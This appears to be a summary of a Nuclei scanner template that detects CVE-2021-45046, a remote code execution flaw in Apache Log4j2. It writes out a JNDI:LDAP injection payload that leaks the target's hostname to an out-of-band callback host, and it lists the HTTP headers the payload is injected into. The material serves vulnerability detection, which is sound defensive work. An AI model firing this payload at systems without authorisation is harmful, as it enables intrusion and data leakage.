---
cve_id: CVE-2021-45046
template_path: nuclei-templates/http/cves/2021/CVE-2021-45046.yaml
affected_product: Apache Log4j2
severity: critical
authentication: none
external_callback: true
affected_versions: unknown
preconditions: Thread Context Lookup Pattern in certain non-default configurations
poc_classification: rce
---

## Vulnerability
Apache Log4j2 Thread Context Lookup Pattern is vulnerable to remote code execution in certain non-default configurations. Successful exploitation could allow an attacker to execute arbitrary code on the affected system.

## PoC / Detection
Classification: rce

The template sends a raw unauthenticated GET request to `/?x=${jndi:ldap://127.0.0.1#.${hostName}.{{interactsh-url}}/a}` with JNDI:LDAP payloads injected into the query string and 15+ HTTP headers (Accept, Accept-Encoding, Accept-Language, Access-Control-Request-*, Authentication, Cookie, Location, Origin, Referer, Upgrade-Insecure-Requests, User-Agent, X-Api-Version, X-CSRF-Token, X-Druid-Comment, X-Forwarded-For, X-Origin). Detection occurs via OAST by matching DNS interactions on `interactsh_protocol` and extracting hostname/injection-point details with regex on `interactsh_request`.

## References
- https://securitylab.github.com/advisories/GHSL-2021-1054_GHSL-2021-1055_log4j2/
- https://twitter.com/marcioalm/status/1471740771581652995
- https://logging.apache.org/log4j/2.x/
- http://www.openwall.com/lists/oss-security/2021/12/14/4
- https://nvd.nist.gov/vuln/detail/CVE-2021-44228
